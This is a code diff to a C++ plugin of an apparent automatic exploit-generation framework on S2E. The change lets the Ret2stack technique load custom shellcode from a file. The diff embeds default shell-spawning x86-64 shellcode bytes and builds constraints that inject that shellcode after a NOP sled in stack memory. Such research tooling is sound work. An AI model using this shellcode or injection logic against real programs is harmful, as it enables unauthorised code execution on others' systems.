@@ -22,6 +22,8 @@
 #include <s2e/Plugins/CRAX/Expr/ConstraintBuilder.h>
 
 #include <cassert>
+#include <filesystem>
+#include <iterator>
 #include <memory>
 
 #include "Ret2stack.h"
@@ -31,16 +33,35 @@ using namespace klee;
 namespace s2e::plugins::crax {
 
 // http://shell-storm.org/shellcode/files/shellcode-806.php
-// TODO: Allow users to specify custom shellcode via config.
-std::string
-Ret2stack::s_shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7"
-                         "\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
+const std::string Ret2stack::s_defaultShellcode
+    = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7"
+      "\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
 
-Ret2stack::Ret2stack() : Technique() {
+Ret2stack::Ret2stack()
+    : Technique(),
+      m_shellcode(initShellcode()) {
     // Generate exploit scripts that start the target process with ASLR disabled.
     g_crax->getExploit().getProcess().setAslrEnabled(false);
 }
 
+
+std::vector<uint8_t> Ret2stack::initShellcode() {
+    std::string filename
+        = g_s2e->getConfig()->getString(getConfigKey() + ".shellcodeFile", "");
+
+    // The user doesn't specify a path to custom shellcode, so use the default one.
+    if (filename.empty() || !std::filesystem::exists(filename)) {
+        log<INFO>() << "Using the default shellcode\n";
+        return std::vector<uint8_t>(s_defaultShellcode.begin(),
+                                    s_defaultShellcode.end());
+    }
+
+    // Load the custom shellcode.
+    log<INFO>() << "Using custom shellcode from file: " << filename << '\n';
+    std::ifstream shellcodeFile(filename, std::ios::binary);
+    return std::vector<uint8_t>(std::istreambuf_iterator<char>(shellcodeFile),
+                                std::istreambuf_iterator<char>());
+}
 
 std::vector<RopPayload> Ret2stack::getRopPayloadList() const {
     S2EExecutionState *state = g_crax->getCurrentState();
@@ -79,7 +100,7 @@ ref<Expr> Ret2stack::analyzeSymbolicBlock(S2EExecutionState &state,
     ref<Expr> falseExpr = ConstantExpr::create(false, Expr::Bool);
 
     // This symbolic memory block is not large enough to inject shellcode.
-    if (symBlockSize < s_shellcode.size()) {
+    if (symBlockSize < m_shellcode.size()) {
         return falseExpr;
     }
 
@@ -89,7 +110,7 @@ ref<Expr> Ret2stack::analyzeSymbolicBlock(S2EExecutionState &state,
 
     ConstraintBuilder cb;
     ref<Expr> exploitConstraint = nullptr;
-    uint64_t shellcodeAddr = symBlockBase + symBlockSize - s_shellcode.size();
+    uint64_t shellcodeAddr = symBlockBase + symBlockSize - m_shellcode.size();
 
     while (shellcodeAddr >= symBlockBase) {
         // Use binary search to find the longest NOP sled.
@@ -135,9 +156,9 @@ ref<Expr> Ret2stack::analyzeSymbolicBlock(S2EExecutionState &state,
 ref<Expr> Ret2stack::injectShellcodeAt(uint64_t addr) const {
     ConstraintBuilder cb;
 
-    for (size_t i = 0; i < s_shellcode.size(); i++) {
+    for (size_t i = 0; i < m_shellcode.size(); i++) {
         ref<Expr> target = mem().readSymbolic(addr + i, Expr::Int8);
-        ref<Expr> value = ConstantExpr::create((uint8_t) s_shellcode[i], Expr::Int8);
+        ref<Expr> value = ConstantExpr::create((uint8_t) m_shellcode[i], Expr::Int8);
         cb.And(EqExpr::create(target, value));
     }
 
